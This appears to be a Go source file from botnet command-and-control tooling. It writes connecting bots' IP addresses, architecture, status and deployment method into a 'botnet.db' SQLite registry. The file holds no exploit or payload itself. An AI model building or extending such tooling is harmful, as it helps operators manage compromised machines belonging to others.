// Sync Go CNC bot connections into IXF Python botnet.db (IXF_BOTNET_DB).
package main

import (
	"database/sql"
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

func botIP(addr net.Addr) string {
	if addr == nil {
		return "unknown"
	}
	host, _, err := net.SplitHostPort(addr.String())
	if err != nil {
		return strings.TrimSpace(addr.String())
	}
	if host == "" {
		return "unknown"
	}
	return host
}

func registryDB() (*sql.DB, error) {
	path := os.Getenv("IXF_BOTNET_DB")
	if path == "" {
		return nil, fmt.Errorf("no registry")
	}
	return sql.Open("sqlite", path+"?_pragma=journal_mode(WAL)&_pragma=busy_timeout(5000)")
}

func registryUpsert(addr net.Addr, arch byte, source string) {
	db, err := registryDB()
	if err != nil {
		return
	}
	defer db.Close()
	ip := botIP(addr)
	now := float64(time.Now().Unix())
	src := source
	if src == "" {
		src = "go-cnc"
	}
	_, _ = db.Exec(`
		CREATE TABLE IF NOT EXISTS bots (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			bot_ip TEXT,
			arch INTEGER,
			source TEXT,
			first_seen REAL,
			last_seen REAL,
			status TEXT DEFAULT 'online',
			deploy_method TEXT DEFAULT 'unknown'
		)`,
	)
	row := db.QueryRow("SELECT id FROM bots WHERE bot_ip=?", ip)
	var id int
	if row.Scan(&id) == nil {
		_, _ = db.Exec(
			"UPDATE bots SET arch=?, source=?, last_seen=?, status='online', deploy_method='go-cnc' WHERE bot_ip=?",
			int(arch), src, now, ip,
		)
	} else {
		_, _ = db.Exec(
			"INSERT INTO bots (bot_ip, arch, source, first_seen, last_seen, status, deploy_method) VALUES (?,?,?,?,?,?,?)",
			ip, int(arch), src, now, now, "online", "go-cnc",
		)
	}
}

func registryTouch(addr net.Addr) {
	db, err := registryDB()
	if err != nil {
		return
	}
	defer db.Close()
	ip := botIP(addr)
	now := float64(time.Now().Unix())
	_, _ = db.Exec("UPDATE bots SET last_seen=?, status='online' WHERE bot_ip=?", now, ip)
}

func registryOffline(addr net.Addr) {
	db, err := registryDB()
	if err != nil {
		return
	}
	defer db.Close()
	ip := botIP(addr)
	_, _ = db.Exec("UPDATE bots SET status='offline' WHERE bot_ip=?", ip)
}
